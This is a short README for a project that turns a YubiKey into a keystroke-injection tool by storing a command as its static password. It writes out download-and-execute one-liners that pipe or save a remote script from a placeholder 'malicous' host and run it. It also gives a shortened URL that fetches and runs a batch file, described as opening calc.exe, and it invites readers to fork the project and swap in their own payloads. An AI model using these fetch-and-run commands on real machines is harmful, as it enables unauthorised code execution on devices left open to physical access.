# yubidied
malicious and non-malicious payloads for yubikeys!
(a new rubber duckie form)

## Concept
The concept is simple - you set a static password as a command, such as:
```txt
curl malicous.example.com -o p.bat && cmd -k p.bat  (Windows)
curl malicous.example.com | bash                    ( Linux )
```
pointing to a payload. It then runs when you open a CMD/SH window, and press the touch sensor.


## Excecution
I recommend forking this, and then changing the payloads you need.

This example depicts a demo "calc.exe" open as a demonstration for Windows users.

(``tinyurl.com/payload`` "points" to ``https://raw.githubusercontent.com/SoftPankek/yubidied/refs/heads/main/verylongthingthatwontfitin38chars``)

```bat
curl tinyurl.com/payload -o p.bat && cmd -k p.bat 
```

## DISCLAIMER
Do ***NOT*** use this for any malicious purposes, and make sure you have explicit permission before testing.
This *can be a serious security issue* and ***should not be messed around with***
